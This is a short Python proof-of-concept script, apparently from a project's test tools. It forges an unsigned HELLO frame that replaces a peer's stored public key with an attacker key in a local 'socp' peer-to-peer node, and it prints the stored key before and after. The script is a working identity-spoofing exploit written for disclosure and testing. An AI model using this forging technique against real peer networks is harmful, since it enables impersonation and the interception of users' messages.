"""
PoC: Forged HELLO replaces a peer record (Python peer)
Run: python tools\tests\forge_hello.py

This script uses the python-peer code in `python-peer/socp` to simulate receiving a HELLO
frame that claims to be another peer but supplies an attacker public key. It demonstrates
that an unsigned HELLO can overwrite the stored pubkey for a fid.

Run this only on your local clone and test environment.
"""
import os
import asyncio
import logging
from types import SimpleNamespace

# add repo python-peer to path
import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'python-peer'))

from socp.storage_sqlite import Store
from socp.p2p import PeerNode
from socp.crypto import load_or_create_key, pubkey_fingerprint_and_b64
from socp.proto import new_envelope, compact_json

logging.basicConfig(level=logging.INFO)

def main():
    db_path = os.path.join(os.path.dirname(__file__), '..', '..', 'var', 'socp.db')
    store = Store(db_path)
    cfg = SimpleNamespace(bind_host="127.0.0.1", bind_port=8047, nick="victim", db_path=db_path)
    node = PeerNode(cfg, store)

    # Create attacker key
    attacker_key_path = os.path.join(os.path.dirname(__file__), '..', '..', 'var', 'attacker_key.pem')
    sk_att = load_or_create_key(path=attacker_key_path)
    fid_att, pub_b64 = pubkey_fingerprint_and_b64(sk_att)

    target_fid = node.fid
    print(f"Before: stored pubkey for {target_fid}: {store.get_peer_pubkey(target_fid)!r}")

    env = new_envelope(typ="HELLO", to="group:public", frm=target_fid, ttl=2,
                       body={"nick": "attacker", "addr": "ws://attacker:9000", "pubkey": pub_b64})
    frame = compact_json(env)

    # Simulate receiving the frame
    asyncio.run(node.on_frame(None, frame))

    print(f"After: stored pubkey for {target_fid}: {store.get_peer_pubkey(target_fid)!r}")

if __name__ == '__main__':
    main()
